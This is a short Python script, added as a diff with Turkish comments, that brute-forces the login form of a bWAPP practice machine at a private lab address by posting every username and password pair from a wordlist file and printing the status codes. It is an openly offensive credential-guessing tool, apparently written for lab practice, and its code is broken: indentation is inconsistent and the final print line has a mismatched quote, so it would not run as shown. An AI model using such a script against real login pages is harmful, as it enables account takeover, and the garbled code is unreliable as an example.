@@ -1,0 +1,12 @@
+import requests
+dosya=open("username_password.txt","r")
+icerik=dosya.read()
+dosya.close()
+web = "http://192.168.154.139/bWAPP/login.php" #bWAPP makinesi giriş kısmı için.
+    
+
+for username in icerik.splitlines():
+        for password in icerik.splitlines():
+            payload = {"login":username,"password":password,"security_level":0,"form":"submit"}
+               sonuc = requests.post(url=web,data=payload)
+                   print ("Username:",username,",password,"Status code:", sonuc.status_code)
